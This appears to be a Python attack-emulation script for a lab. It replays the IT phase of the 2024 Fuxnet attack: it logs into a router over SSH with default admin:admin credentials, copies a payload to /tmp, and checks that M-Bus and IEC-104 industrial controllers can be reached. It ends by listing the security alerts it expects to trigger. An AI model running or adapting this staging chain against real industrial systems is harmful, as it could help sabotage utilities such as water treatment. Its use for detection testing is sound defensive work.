#!/usr/bin/env python3
"""
Fuxnet IT-Side Phase (Blackjack group, Ukraine 2024)

Blackjack accessed Moscollector's sensor management network.
Specific IT artifacts are unknown - strong OPSEC. We mirror the
FrostyGoop model: router was the initial access (Phase 0 already done).

This IT phase:
  1. Confirms SSH access to compromised router (admin:admin)
  2. Stages fuxnet_router.py on the router via SCP
  3. Verifies M-Bus:5000 and IEC-104:2404 reachable from router
  4. OT phase (fuxnet_exec.py) then runs the payload from the router

Same model as FrostyGoop - router is the attack launchpad.
No WinRM, no AD lateral movement, no Meterpreter.
"""

import sys
import os
import subprocess
import shutil

ROUTER_IP   = '192.168.0.13'
ROUTER_USER = 'admin'
ROUTER_PASS = 'admin'
MBUS_GW     = '192.168.1.18'
IEC104_PLC  = '192.168.1.10'
REMOTE_PATH = '/tmp/fuxnet_router.py'

THIS_DIR = os.path.dirname(os.path.abspath(__file__))
PAYLOAD  = os.path.normpath(os.path.join(
    THIS_DIR, '..', '..', '..', 'perform_malware_simulations', 'fuxnet', 'fuxnet_router.py'
))


def _have_sshpass():
    return shutil.which('sshpass') is not None


def _ssh(cmd, timeout=20):
    base = ['-o', 'StrictHostKeyChecking=no', '-o', 'UserKnownHostsFile=/dev/null']
    if _have_sshpass():
        full = ['sshpass', '-p', ROUTER_PASS, 'ssh'] + base + [f'{ROUTER_USER}@{ROUTER_IP}', cmd]
    else:
        full = ['ssh'] + base + [f'{ROUTER_USER}@{ROUTER_IP}', cmd]
    try:
        r = subprocess.run(full, capture_output=True, text=True, timeout=timeout)
        return r.returncode == 0, (r.stdout + r.stderr).strip()
    except Exception as e:
        return False, str(e)


def _scp(local, remote, timeout=20):
    base = ['-o', 'StrictHostKeyChecking=no', '-o', 'UserKnownHostsFile=/dev/null']
    if _have_sshpass():
        cmd = ['sshpass', '-p', ROUTER_PASS, 'scp'] + base + [local, f'{ROUTER_USER}@{ROUTER_IP}:{remote}']
    else:
        cmd = ['scp'] + base + [local, f'{ROUTER_USER}@{ROUTER_IP}:{remote}']
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return r.returncode == 0
    except Exception:
        return False


def run_fuxnet_it_phase(**_kwargs):
    if not _have_sshpass():
        print("[!] sshpass not found (apt install sshpass) - SSH steps may prompt for password")

    print("""
╔══════════════════════════════════════════════════════════════╗
║  FUXNET - IT PHASE                                           ║
║  Blackjack group (Ukraine) | Moscollector 2024               ║
╚══════════════════════════════════════════════════════════════╝

TARGET: Moscollector M-Bus sensor infrastructure (87,000 sensors)
ACTOR:  Blackjack (Ukrainian hacktivists, strong OPSEC)
CHAIN:  Router already compromised (Phase 0) → stage payload → execute
MODEL:  Same as FrostyGoop - router is the attack launchpad, no Windows pivot
""")

    # ── Step 1: Confirm router SSH access ────────────────────────────
    print("═══ STEP 1: ROUTER ACCESS (Phase 0 already established) ═══")
    ok, out = _ssh('id && hostname')
    if ok:
        print(f"[[+]] Router {ROUTER_IP} SSH alive - admin:admin confirmed")
        for line in out.splitlines()[:3]:
            print(f"    {line}")
    else:
        print(f"[!] Router SSH not responding - Phase 0 router exploit must run first")
        print(f"    ({out[:100]})")

    # Confirm OT-side IP
    ok, out = _ssh("ip addr show | grep '192.168.1'")
    if ok and out:
        print(f"[[+]] Router has OT subnet address:")
        for line in out.splitlines():
            print(f"    {line.strip()}")
    print(f"[*] 192.168.1.4 in OT subnet → direct M-Bus access, no SOCKS5 needed")

    # ── Step 2: Stage payload on router ─────────────────────────────
    print("\n═══ STEP 2: PAYLOAD STAGING (fuxnet_router.py → router) ═══")
    print("[*] Fuxnet is Python (stdlib-only) - no Go compilation, no binary AV issues")
    print(f"[*] SCP {os.path.basename(PAYLOAD)} → {ROUTER_IP}:{REMOTE_PATH}")

    ok = _scp(PAYLOAD, REMOTE_PATH)
    if ok:
        print(f"[+] Payload staged successfully")
        ok2, out2 = _ssh(f'ls -lh {REMOTE_PATH} && python3 --version')
        for line in out2.splitlines():
            print(f"    {line}")
    else:
        print(f"[!] SCP upload failed - check sshpass or router reachability")

    # ── Step 3: Verify OT targets reachable from router ─────────────
    print("\n═══ STEP 3: OT TARGET REACHABILITY FROM ROUTER ═══")

    for desc, ip, port in [
        ("M-Bus gateway  ", MBUS_GW,   5000),
        ("IEC-104 SCADA  ", IEC104_PLC, 2404),
    ]:
        probe = (
            f"python3 -c \""
            f"import socket, sys; s=socket.socket(); s.settimeout(2); "
            f"r=s.connect_ex(('{ip}', {port})); s.close(); "
            f"print('REACHABLE' if r==0 else 'UNREACHABLE')\""
        )
        ok, out = _ssh(probe)
        reachable = 'REACHABLE' in out
        status = "[[+]] REACHABLE" if reachable else "[!] unreachable"
        print(f"    {desc}  {ip}:{port}  {status}")

    print(f"\n[+] Fuxnet IT phase complete - payload staged, OT path confirmed")
    print(f"[→] OT phase executes: python3 {REMOTE_PATH} --target {MBUS_GW} --combo-target {IEC104_PLC}")
    print(f"\nExpected XSIAM alerts:")
    print(f"  • SSH session from attacker to router (lateral movement)")
    print(f"  • File creation in /tmp on router (fuxnet_router.py)")
    print(f"  • M-Bus TCP from 192.168.1.4 (router) → PLC-9 (unexpected source)")
    print(f"  • IEC-104 commands from router (not HMI) → PLC-1 water treatment")


def main():
    import argparse
    p = argparse.ArgumentParser()
    p.add_argument('--hmi-ip',   default='192.168.1.55')   # kept for call-signature compat
    p.add_argument('--hmi-user', default='operator')
    p.add_argument('--hmi-pass', default='labpass123')
    args = p.parse_args()
    run_fuxnet_it_phase()


if __name__ == '__main__':
    main()
